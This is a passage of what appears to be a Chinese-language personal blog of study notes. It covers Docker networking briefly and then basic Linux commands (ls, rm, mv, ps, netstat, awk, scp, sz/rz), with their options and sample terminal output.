bash"><table><tr><td class="code"><pre><span class="line">docke system/image prune</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240324230130877.png" alt="image-20240324230130877"></p><h2 id="docker-network"><a href="#docker-network" class="headerlink" title="docker network"></a>docker network</h2><p>docker0 实现容器互相通信以及容器和宿主机互相通信</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure><p>查看所有网络</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  NETWORK ID     NAME                     DRIVER    SCOPE</span><br><span class="line">6e6425c662ac   bridge                   bridge    local</span><br><span class="line">293407e0c5ce   cve-2017-10271_default   bridge    local</span><br><span class="line">743e5e15a2d5   host                     host      local</span><br><span class="line">1ba283749203   none                     null      local</span><br></pre></td></tr></table></figure><p>创建网络</p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2023/11/01/Linux%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/11/01/Linux%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Linux下基本命令的掌握"><a href="#Linux下基本命令的掌握" class="headerlink" title="Linux下基本命令的掌握"></a>Linux下基本命令的掌握</h2><h3 id="ls指令"><a href="#ls指令" class="headerlink" title="ls指令"></a>ls指令</h3><p>语法：ls [ 选项 ] [文件或目录]</p><p>功能：对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。</p><p>常用选项：</p><ul><li>-a 列出目录下的所有文件，包括以.开头的隐含文件。</li><li>-d 将目录象文件一样显示，而不是显示其下的文件。如:ls -d指定目录</li><li>-i 输出文件的i节点的索引信息。如ls -ai指定文件</li><li>-k 以k字节的形式表示文件的大小。ls -alk 指定文件</li><li>-| 列出文件的详细信息。</li><li>-t 以时间排序。</li><li>-R 列出所有子目录下的文件。(递归)</li><li>-h 可以显示大小单位，但要和-l参数一起使用</li></ul><h4 id="文件系统可以看这篇文章——-详细讲解，Linux内核——文件系统（建议收藏）-https-zhuanlan-zhihu-com-p-505338841"><a href="#文件系统可以看这篇文章——-详细讲解，Linux内核——文件系统（建议收藏）-https-zhuanlan-zhihu-com-p-505338841" class="headerlink" title="文件系统可以看这篇文章——[详细讲解，Linux内核——文件系统（建议收藏）][https://zhuanlan.zhihu.com/p/505338841]"></a>文件系统可以看这篇文章——[详细讲解，Linux内核——文件系统（建议收藏）][<a href="https://zhuanlan.zhihu.com/p/505338841]">https://zhuanlan.zhihu.com/p/505338841]</a></h4><h4 id="ls通配符的使用"><a href="#ls通配符的使用" class="headerlink" title="ls通配符的使用"></a>ls通配符的使用</h4><table><thead><tr><th>通配符</th><th>含义</th></tr></thead><tbody><tr><td>*</td><td>代表任意个数个字符</td></tr><tr><td>？</td><td>代表任意一个字符，至少1个</td></tr><tr><td>[]</td><td>表示可以匹配字符组中的任意一个</td></tr><tr><td>[abc]</td><td>匹配abc中的任意一个</td></tr><tr><td>[a-f]</td><td>匹配a到f范围内的任意一个字符</td></tr></tbody></table><p>硬链接数：通俗的讲就是有多少种方式可以访问当前的目录</p><h3 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h3><p>语法：pwd</p><p>功能：显示用户当前所在目录</p><p>常用选项：无</p><p><img src="/../image/image-20231031195748175.png" alt="image-20231031195748175"></p><h3 id="cd指令"><a href="#cd指令" class="headerlink" title="cd指令"></a>cd指令</h3><p>Linux系统中，磁盘上的文件和目录被组成一颗目录树，每个节点都是目录或文件</p><p>语法：cd 目录名</p><p>功能：改变工作目录，将当前工作目录改变到指定的目录下</p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ..: 返回上级目录</span><br><span class="line">cd /root/Desktop: 绝对路径</span><br><span class="line">cd ../day02/:相对路径</span><br><span class="line">cd ~: 进入用户家目录</span><br><span class="line">cd -: 返回最近访问的目录</span><br></pre></td></tr></table></figure><h3 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h3><p>语法：touch [选项]…文件…</p><p>功能：touch命令参数可更改文档或目录的日期时间，包括存取时间和更改时间，或者新建一个不存在的文件。</p><p>常用选项：</p><ul><li>-a 或-time&#x3D;atime或–time-access或–time&#x3D;use只改存取时间</li><li>-d 适用指定的日期时间，而非现在的时间</li><li>-f 此参数将忽略不予处理，仅负责解决BSD版本和touch指令的兼容性问题。</li><li>-m 或–time&#x3D;mtime或–time&#x3D;modify 只更改变动时间</li><li>-r 把指定文档或目录的日期时间，统统设成和参考文档或目录的日期时间相同</li><li>-t 使用指定的日期时间，而非现在的时间</li></ul><p>如果文件不存在，可以创建一个空白文件</p><p>如果文件已经存在，可以修改文件的末次修改日期</p><h3 id="mkdir指令（重要）"><a href="#mkdir指令（重要）" class="headerlink" title="mkdir指令（重要）"></a>mkdir指令（重要）</h3><p>语法：mkdir [选项] dirname…</p><p>功能：在当前目录下创建一个名问dirname的目录</p><p>常用选项：</p><ul><li>-p,–parents 可以是一个路径名称。此时若路径中的某些目录尚不存在，加上此选项后，系统将自动建立那些尚不存在的目录，即一次可以建立多个目录。</li></ul><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdi -p /test/test1</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20231031202106611.png" alt="image-20231031202106611"></p><h3 id="rmdir指令-amp-amp-rm指令（重要）"><a href="#rmdir指令-amp-amp-rm指令（重要）" class="headerlink" title="rmdir指令&amp;&amp;rm指令（重要）"></a>rmdir指令&amp;&amp;rm指令（重要）</h3><p>rmdir是一个与mkdir相应的命令，mkdir是建立目录，而rmdir是删除命令。</p><p>语法：rmdir [-p] [dirname]</p><p>适用对象：具有当前目录操作权限的使用者</p><p>功能：删除空目录</p><p>常用选项：</p><ul><li>-p 当子目录被删除后如果父目录变成空目录的话，就连带父目录一起删除</li></ul><p>rm命令可以同时删除文件或目录</p><p>语法： rm[-f-i-r-v] [dirname&#x2F;dir]</p><p>适用对象：所有适用者</p><p>功能：删除文件或目录</p><p>常用选项：</p><ul><li>-f 即使文件属性为只读，也直接删除</li><li>-i 删除前逐一询问确认</li><li>-r 删除目录及其下所有文件，删除文件夹必须加此参数</li></ul><h3 id="man指令（重要）"><a href="#man指令（重要）" class="headerlink" title="man指令（重要）"></a>man指令（重要）</h3><p>Linux的命令有很多参数，我们不可能全记住，我们可以通过查看联机手册获取帮助。访问Linux手册页的命令是man。</p><p>语法：man [选项] 命令</p><p>常用选项：</p><ul><li><p>-k 根据关键词搜索联机帮助</p></li><li><p>num只在第num章节找</p></li><li><p>-a 将所有章节的都显示出来，比如man printf它缺省从第一章开始搜索，知道就停止，用a选项，当按下q退出，他会继续往后面搜索，知道所有章节都搜索完毕</p></li><li><p>1是普通命令</p></li><li><p>2 是系统调用如open，write之类的（通过这个，至少可以方便的差导调用这个函数们需要加什么头文件）</p></li><li><p>3 是库函数,如printf,fread</p></li><li><p>4 是特殊文件,也就是&#x2F;dev下的各种设备文件</p></li><li><p>5 是指文件的格式,比如passwd,就会说明这个文件中各个字段的含义</p></li><li><p>6 是给游戏留的,由各个游戏自己定义</p></li><li><p>7 是附件还有一些变量,比如向environ这种全局变量在这里就有说明</p></li><li><p>8 是系统管理用的命令,这些命令只能由root使用,如ifconfig</p></li></ul><p>man手册可以汉化。</p><h3 id="cp指令重要"><a href="#cp指令重要" class="headerlink" title="cp指令重要"></a>cp指令重要</h3><p>语法：cp [选项] 源文件或者目录 目标文件或者目录</p><p>功能：复制文件或目录</p><p>说明：cp指令用于复制文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个已经存在的目录，则它会把前面指定的所有文件或目录复制到此目录中。若同时指定多个文件或目录，而最后的目的地并非一个已存在的目录，则会出现错误信息</p><p><img src="/../image/image-20231031210152423.png" alt="image-20231031210152423"></p><p>常用选项：</p><ul><li>-f或–force强行复制文件或目录，不论目的文件或目录是否已经存在</li><li>-i或–interactive覆盖文件之前先询问用户</li><li>-r递归处理，将指定目录下的文件与子目录一并处理。若源文件或目录的志，不属于目录或符号链接，则一律视为普通文件处理</li><li>-R或–recursive递归处理，将指定目录下的文件及子自录—升处理</li></ul><h3 id="mv指令（重要）"><a href="#mv指令（重要）" class="headerlink" title="mv指令（重要）"></a>mv指令（重要）</h3><p>mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename)files）,是linux系统下常用的命令。经常用来备份文件或目录</p><p>语法：mv [选项] 源文件或者目录 目标文件或者目录</p><p>功能：</p><ol><li>视mv命令中第二个参数类型的不同(是目标文件还是目标目录)，mv命令将文件重命名或将其移至一个新的目录中。</li><li>当第二个参数类型是文件时、mv命令完成文件重命名，此时，源文件只能有一个(也可以是源目录名)，它将所给的源文件或目录重命名为给定的日标文件名。</li><li>当第二个参数是已存在的目录名称时，源文件或目录参数可以有多个，mv命令将各参数指定的源文件均移至目标目录中。</li></ol><p>常用选项：</p><ul><li>-f : force强制的意思，如果目标文件已经存在，不会询问而直接覆盖. </li><li>-i :若目标文件(destination)已经存在时，就会询问是否覆盖!</li></ul><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将rm改成mv</span><br><span class="line">vim ~/.bashrc #修改这个文件</span><br><span class="line">mkdir -p ~/.trash</span><br><span class="line">alias rm=trash</span><br><span class="line">alias ur=undelfile</span><br><span class="line">undelfile() &#123;</span><br><span class="line">mv -i !.trash/\$@ ./</span><br><span class="line">&#125;</span><br><span class="line">trash() &#123;</span><br><span class="line">mv $@ ~/.trash/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>语法： cat [选项] [文件]</p><p>功能：查看目标文件内容</p><p>常用选项：</p><ul><li>-b 对非空输出行编号</li><li>-n 对输出的所有行编号</li><li>-s 不输出多行空行</li></ul><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p>date指定格式显示时间 date+%Y:%m:%d</p><p>date用法：date[option]…[+Format]</p><ol><li><p>在显示方面，使用者可以设定欲显示的格式，格式设定为一个加号后接数个标记，其中常用的标记列表如下</p><ul><li>%H:小时(O0..23)</li><li>%M:分钟(00..59)</li><li>%S∶秒(00..61)</li><li>%X∶相当于%H:%M:%S</li><li>%d:日(01..31)</li><li>%m :月份(01..12)</li><li>%Y:完整年份(0000..9999)</li><li>%F:相当于%Y-%m-%d</li></ul></li><li><p>在设定时间方面</p><ul><li>date -s &#x2F;&#x2F;设置当前时间，只有root权限才能设置，其他只能查看。</li><li>date -s 20080523&#x2F;设置成20080523，这样会把具体时间设置成空00:00:00</li><li>date -s 01:01:01&#x2F;&#x2F;设置具体时间，不会对日期做更改</li><li>date -s “01:01:01 2008-05-23”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “01:01:01 20080523”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “2008-05-23 01:01:01”&#x2F;&#x2F;这样可以设置全部时间</li><li>date -s “200805230 1:01:01”&#x2F;&#x2F;这样可以设置全部时间</li></ul></li><li><p>时间戳</p><p>时间-&gt;时间戳</p><ul><li>date +%s</li></ul><p>时间戳-&gt;时间</p><ul><li>date+%Y:%m:%d -d @1599642565</li></ul><p>Unix时间戳(英文为Unix epoch, Unix time, POSIX time或Unix timestamp)是从1970年1月1日(UTCGMT的午夜)开始所经过的秒数，不考虑闰秒。</p></li></ol><h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。我们目前要了解的选项</p><p>选项：</p><ul><li>-u&lt;用户名&gt;指定用户名</li><li>-p&lt;进程号&gt;指定进程</li><li>-n&lt;次数&gt;循环显示的次数</li></ul><h3 id="shutdown关机"><a href="#shutdown关机" class="headerlink" title="shutdown关机"></a>shutdown关机</h3><p>语法：shutdown [选项] 常见选项：</p><ul><li>-h :将系统的服务停掉后，立即关机</li><li>-r ︰在将系统的服务停掉之后就重新启动</li><li>-t sec : -t后面加秒数，亦即『过几秒后关机』的意思</li></ul><p>如果后面购买了云服务器，尽量不要使用shutdown来关机，因为云服务器一般都要保证服务器一直在线，使用exit或者ctrl+d退出即可</p><h3 id="重要的几个热键-Tab-CTRL-c-CTRL-d"><a href="#重要的几个热键-Tab-CTRL-c-CTRL-d" class="headerlink" title="重要的几个热键[Tab],[CTRL]+c,[CTRL]+d"></a>重要的几个热键[Tab],[CTRL]+c,[CTRL]+d</h3><ul><li><p>ctrl + d：退出登陆用户或键盘输入结束</p></li><li><p>tab键：命令或档案的补全</p></li><li><p>ctrl+c：终止前台异常进程</p></li></ul><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><ul><li>-n：显示匹配行及行号</li><li>-v：显示不包括匹配文本的所有行（相当于求反）</li><li>-i：忽略大小写</li></ul><p>常用的两种查找模式</p><ul><li>^a：行首，搜寻以a开头的行</li><li>ke$行尾，搜索以ke结束的行</li></ul><h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>先 ssh  [-p port] user@remote 登陆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 把堂前目录下的01.py文件复制到远程家目录下的 Desktop/0.1py</span><br><span class="line"># 注意：`:`后面的路径如果不是绝对路径，则以用户的家目录作为参照路径</span><br><span class="line">scp -P port 01.py user@remote:Desktop/01.py</span><br><span class="line"></span><br><span class="line"># 把远程家目录下的Desktop/01.oy文件复制到本地当前目录下的01.py</span><br><span class="line">scp -P port user@remote:Desktop/01.py 01.py</span><br><span class="line"></span><br><span class="line"># 加上-r可以传送文件夹</span><br><span class="line">scp -r demo user@remote:Desktop</span><br><span class="line"></span><br><span class="line">scp -r user@remote:Desktop demo</span><br></pre></td></tr></table></figure><h3 id="以下命令后续逐一补全"><a href="#以下命令后续逐一补全" class="headerlink" title="以下命令后续逐一补全:"></a>以下命令后续逐一补全:</h3><ul><li>安装和登录命令: login、shutdown、halt、reboot、install、mount、umount、chsh、exit、last;</li><li>文件处理命令: file、mkdir、grep、dd、find、mv、ls、diff、cat、In;</li><li>系统管理相关命令: df、top、free、quota、at、lp、adduser、groupadd、kill、crontab;</li><li>网络操作命令: ifconfig、 ip、ping、netstat、telnet、ftp、route、rlogin、rcp、finger、mail、nslookup</li><li>系统安全相关命令: passwd、su、umask、chgrp、chmod、chown、chattr、sudo ps、who;</li><li>其它命令: tar、unzip、gunzip、unarj、mtools、man、unendcode、uudecode。</li></ul><h3 id="netstat-重要"><a href="#netstat-重要" class="headerlink" title="netstat (重要)"></a>netstat (重要)</h3><p><code>netstat</code>命令用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。<code>netstat</code>是在内核中访问网络及相关信息的程序，它能提供TCP连接，TCP和UDP监听，进程内存管理的相关报告。</p><ul><li><p>-a：查看所有连接</p></li><li><p>-c：持续列出网络状态</p></li><li><p>-e：显示网络其他相关信息</p></li><li><p>-n:直接打印连接的IP地址与端口信息</p></li><li><p>-l  或–listening           显示监控中的服务器的Socket。</p></li><li><p>-p  或–programs         显示正在使用Socket的程序识别码和程序名称。</p></li><li><p>-r：显示路由信息</p></li><li><p>-t：显示TCP传输协议的连线状况</p></li></ul><p>netstat -lntp可以用来查看服务器是什么</p><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux 查看进程详细状况</span><br><span class="line">-a 显示终端上的所有进程，包括其它用户的进程</span><br><span class="line">-u 显示进程的详细状态</span><br><span class="line">-x 显示没有控制终端的进程</span><br><span class="line">减号-可以不带</span><br><span class="line">top 动态显示运行中的进程并且排序</span><br><span class="line">kill [-9] PID 终止指定代号的进程 -9表示强行终止</span><br></pre></td></tr></table></figure><blockquote><p>提示:使用 kill命令时，最好只终止由当前用户开启的进程，而不要终止root身份开启的进程，否则可能导致系统崩溃</p></blockquote><h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>查看进程的PID、名称以及CPU占用率：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps axo pid,comm,pcpu</span><br></pre></td></tr></table></figure><p>按内存资源的使用量对进程进行排序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux | sort -rnk <span class="number">4</span></span><br></pre></td></tr></table></figure><p>按CPU资源的使用量对进程进行排序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux | sort -nk <span class="number">3</span></span><br></pre></td></tr></table></figure><p>显示所有进程信息：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -A</span><br></pre></td></tr></table></figure><p>显示指定用户信息：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -u root</span><br></pre></td></tr></table></figure><p>查看线程数：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -efL</span><br></pre></td></tr></table></figure><p>查看进程并按内存使用大小排列：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -e -o <span class="string">&quot;%C : %p :%z : %a&quot;</span> | sort -k5 -nr</span><br></pre></td></tr></table></figure><p>显示所有进程信息，连同命令行：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -ef</span><br></pre></td></tr></table></figure><p>ps与grep常用组合用法，查找特定进程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -ef | grep ssh</span><br></pre></td></tr></table></figure><p>通过名字或命令搜索进程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -C nginx</span><br></pre></td></tr></table></figure><p>CPU或者内存进行排序，降序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux --sort=-pcpu,+pmem</span><br></pre></td></tr></table></figure><p>用树的风格显示进程的层次关系：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -f --forest -C nginx</span><br></pre></td></tr></table></figure><p>显示一个父进程的子进程：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -o pid,uname,comm -C nginx</span><br></pre></td></tr></table></figure><p>重定义标签：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -e -o pid,uname=<span class="variable constant_">USERNAME</span>,pcpu=<span class="variable constant_">CPU_USAGE</span>,pmem,comm</span><br></pre></td></tr></table></figure><p>显示进程运行的时间：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -e -o pid,comm,etime</span><br></pre></td></tr></table></figure><p>查看named进程详细信息：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -aux | grep named</span><br></pre></td></tr></table></figure><p>通过进程id获取服务名称：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -o command -p <span class="number">91730</span> | sed -n 2p</span><br></pre></td></tr></table></figure><p>将目前属于您自己这次登入的PID与相关信息列示出来：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -l</span><br></pre></td></tr></table></figure><p>列出目前所有的正在内存当中的程序：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux</span><br></pre></td></tr></table></figure><p>找出与<code>cron</code>与<code>syslog</code>这两个服务有关的PID号码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps aux | egrep <span class="string">&#x27;(cron|syslog)&#x27;</span></span><br></pre></td></tr></table></figure><p>把所有进程显示出来，并输出到<code>ps001.txt</code>文件：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -aux &gt; ps001.<span class="property">txt</span></span><br></pre></td></tr></table></figure><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>awk是一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得<br>尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各<br>种分析处理。</p><p>awk有3个不同版本: awk、 nawk和gawk, 未作特别说明，一般指gawk, gawk 是AWK的GNU版本。<br>awk其名称得自于它的创始人Alfred Aho、Peter Weinberger和Brian Kernighan 姓氏的首个字母。实<br>际上AWK的确拥有自己的语言: AWK 程序设计语言，三位创建者已将它正式定义为“样式扫描和处<br>理语言”。它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计<br>算以及生成报表，还有无数其他的功能。</p><p>有三种方式调用awk:</p><ul><li>1.命令行方式- (重点介绍)<br>awk [-F field-separator]<br>commands’<br>input-file(s)<br>其中，commands是真正awk命令，[-F域分隔符]是可选的。input-file(s) 是待处理的文件。<br>在awk中，文件的每一行中， 由域分隔符分开的每一项称为- 一个域。通常，在不指名F域分隔<br>符的情况下，默认的域分隔符是空格。</li><li>shell脚本方式<br>将所有的awk命令插入-一个文件，并使awk程序可执行，然后awk命令解释器作为脚本的首行，<br>-般通过键入脚本名称来调用。<br>相当于shell脚本首行的: #!&#x2F;bin&#x2F;bash<br>可以换成: #!&#x2F;bin&#x2F; awk</li><li>将所有的awk命令插入- -个单独文件,然后调用:<br>awk -f awk -script-file input-file(s)<br>其中，-f选项加载awk- script-file中的awk脚本，input-file(s) 跟上面的是一样</li></ul><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ last -5</span><br><span class="line">youzipii pts/1        192.168.174.1    Wed Mar 13 17:17   still logged in</span><br><span class="line">youzipii pts/0        :0               Wed Mar 13 17:16   still logged in</span><br><span class="line">youzipii :0           :0               Wed Mar 13 17:11   still logged in</span><br><span class="line">(unknown :0           :0               Wed Mar 13 16:54 - 17:11  (00:17)</span><br><span class="line">reboot   system boot  3.10.0-514.el7.x Wed Mar 13 16:53 - 17:28  (00:34)</span><br><span class="line">wtmp begins Thu Dec 26 18:50:02 2019</span><br><span class="line">wtmp begins Thu Dec 26 18:50:02 2019</span><br><span class="line">[youzipii@localhost ~]$ last -n 5 | awk &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line">youzipii</span><br><span class="line">youzipii</span><br><span class="line">youzipii</span><br><span class="line">(unknown</span><br><span class="line">reboot</span><br><span class="line">wtmp</span><br></pre></td></tr></table></figure><p>awk工作流程是这样的:读入有’ \n’换行符分割的一- 条记录，然后将记录按指定的域分隔符划分域，<br>填充域，$0则表示所有域, $1表示第- -个域, $n表示第n个域。默认域分隔符是”空白键”或”[tab]<br>键”,所以$1表示登录用户，$3表示登录用户ip,以此类推,可以用逗号隔开</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ cat /etc/passwd | awk -F &#x27;:&#x27; &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">lp</span><br><span class="line">sync</span><br><span class="line">[youzipii@localhost ~]$ cat /etc/passwd | awk -F &#x27;:&#x27; &#x27;&#123;print $1&quot;\t&quot;$7&#125;&#x27;</span><br><span class="line">root    /bin/bash</span><br><span class="line">bin     /sbin/nologin</span><br><span class="line">daemon  /sbin/nologin</span><br><span class="line">adm     /sbin/nologin</span><br><span class="line">lp      /sbin/nologin</span><br><span class="line">sync    /bin/sync</span><br><span class="line">[youzipii@localhost ~]$ ifconfig | awk &#x27;/mask/&#x27;</span><br><span class="line">        inet 192.168.174.142  netmask 255.255.255.0  broadcast 192.168.174.255</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>-F 指定分隔符为：</p><p>&#x2F;内容&#x2F;打印内容所在行</p><h3 id="which"><a href="#which" class="headerlink" title="which"></a>which</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">which ls</span><br><span class="line"># 输出 /bin/ls</span><br><span class="line"></span><br><span class="line">which useradd</span><br><span class="line"># 输出 /usr/sbin/useradd</span><br></pre></td></tr></table></figure><h4 id="bin和sbin"><a href="#bin和sbin" class="headerlink" title="bin和sbin"></a>bin和sbin</h4><p>在Linux中，绝大多数可执行文件都是保存在&#x2F;bin、&#x2F;sbin、&#x2F;usr&#x2F;bin、&#x2F;usr&#x2F;sbin</p><p>&#x2F;bin(binary)是二进制执行文件目录，主要用于具体应用</p><p>&#x2F;sbin(system binary)是系统管理员专用的二进制代码存放目录，主要用于系统管理</p><p>&#x2F;usr&#x2F;bin(user commands for applications)后期安装的一些软件</p><p>&#x2F;usr&#x2F;sbin(super user commands for applications)超级用户的一些管理程序</p><h3 id="df-x2F-du"><a href="#df-x2F-du" class="headerlink" title="df&#x2F;du"></a>df&#x2F;du</h3><p>disk freee显示磁盘剩余空间</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">df -h 显示磁盘剩余空间 重点看根目录挂在的那一条</span><br><span class="line">du -h 目录名 显示目录下空间占用情况</span><br><span class="line">-h 以人性化的方式显示文件大小</span><br></pre></td></tr></table></figure><p>du常用命令：du -sh *显示目录下所有文件的大小</p><h3 id="ln-建立链接"><a href="#ln-建立链接" class="headerlink" title="ln 建立链接"></a>ln 建立链接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s 被链接的源文件 链接文件 //建立文件的软链接，用通俗的方式讲类似于 Windows下的快捷方式</span><br></pre></td></tr></table></figure><blockquote><p>注意：没有-s建立的是一个硬链接</p><p>两个文件占用相同大小的硬盘空间，工作中几乎不会建立</p><p>源文件要使用绝对路径，这样方便文件移动后继续使用</p></blockquote><p><img src="/../image/image-20241011164447490.png" alt="image-20241011164447490"></p><p>在 Linux 中，文件名 和 文件的数据 是分开存储的</p><ul><li>提示:<br>在 Linux 中，只有文件的硬链接数&#x3D;&#x3D;0才会被删除使用 </li><li>使用ls -l可以查看一个文件的硬链接的数量在日常工作中</li></ul><h3 id="sz和rz"><a href="#sz和rz" class="headerlink" title="sz和rz"></a>sz和rz</h3><p><code>sz</code> 和 <code>rz</code> 是用于在 Linux 系统中进行文件传输的命令，通常用于通过终端连接到远程服务器，并在本地和远程系统之间传输文件。</p><h4 id="rz-命令"><a href="#rz-命令" class="headerlink" title="rz 命令"></a>rz 命令</h4><p><code>rz</code> 命令用于将文件从客户端传输到服务器端。在使用 <code>rz</code> 命令之前，需要在终端模拟器中设置允许 X&#x2F;Y&#x2F;ZMODEM 传输，通常可以通过终端模拟器的设置或菜单中找到相应选项。一般来说，你可以通过在终端中输入 <code>rz</code> 命令来启动接收文件的过程。</p><h4 id="sz-命令"><a href="#sz-命令" class="headerlink" title="sz 命令"></a>sz 命令</h4><p><code>sz</code> 命令用于将文件从服务器端传输到客户端。在使用 <code>sz</code> 命令之前，你需要在服务器端调用 <code>sz</code> 并在终端模拟器中打开一个文件选择器，选择要发送的文件。选择完成后，文件将通过 ZMODEM 协议发送到客户端。</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><ol><li>首先，通过 SSH 或其他远程连接方式连接到目标 Linux 服务器。</li><li>在服务器上使用 <code>rz</code> 命令来接收文件，或者使用 <code>sz</code> 命令来发送文件。</li><li>在本地终端中，选择接收文件（使用 <code>rz</code>）或发送文件（使用 <code>sz</code>）。</li></ol><p>这两个命令通常与终端模拟器（如 SecureCRT、PuTTY 等）一起使用，以便在终端界面中进行文件传输。在使用这些命令时，确保你的终端支持 ZMODEM 文件传输协议，以便顺利传输文件。</p><p>请注意，为了使用这些命令，你的系统中需要安装 <code>lrzsz</code> 软件包。如果你的系统中没有安装，可以通过包管理器进行安装。不安装lrzsz有些shell终端rz时不会弹出文件选择框,比如mobaxterm</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum list installed | grep lrzsz</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241107154833989.png" alt="image-20241107154833989"></p><p>这样没有显示就是没装，我们先给他装一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y lrzsz</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241107155041938.png" alt="image-20241107155041938"></p><h5 id="rz"><a href="#rz" class="headerlink" title="rz"></a>rz</h5><p>rz (Receive ZMODEM)：使用 ZMODEM 协议,将本地文件批量上传到远程 Linux&#x2F;Unix 服务器,注意不能上传文件夹,如果上传文件夹,请先打包再下载.</p><p>rz 命令常用参数</p><ul><li>-h:显示帮助信息,根据具体的需要选择不同的参数即可</li><li>-b : 以二进制的方式进行传输,推荐使用</li><li>-e : 对所有的控制字符进行字符转义,推荐使用</li><li>–version : 查看 lrzsz 的版本</li></ul><p>一般使用 rz -b -e filename</p><p><img src="/../image/image-20241107155538906.png" alt="image-20241107155538906"></p><p><img src="/../image/image-20241107155547425.png" alt="image-20241107155547425"></p><h5 id="sz"><a href="#sz" class="headerlink" title="sz"></a>sz</h5><p>sz (Send ZMODEM)：使用 ZMODEM 协议,可将多个文件从远程 Linux&#x2F;Unix 服务器下载到本地.注意不能下载文件夹,如果下载文件夹,请先打包再下载.</p><p>sz [选项] [filelist]<br>命令选项基本与 rz 相同,具体的选项可以使用 sz -h 来查看<br>例如:下载多个文件<br>输入 sz file1 file2 file3 .</p><p><img src="/../image/image-20241107155830493.png" alt="image-20241107155830493"></p><p>这里和选的路径好像还有关系，有些路径他会卡住，我后面选桌面他就直接下载下来了</p><p><img src="/../image/image-20241107160014921.png" alt="image-20241107160014921"></p><h2 id="Linux重定向管道命令环境变量PATH"><a href="#Linux重定向管道命令环境变量PATH" class="headerlink" 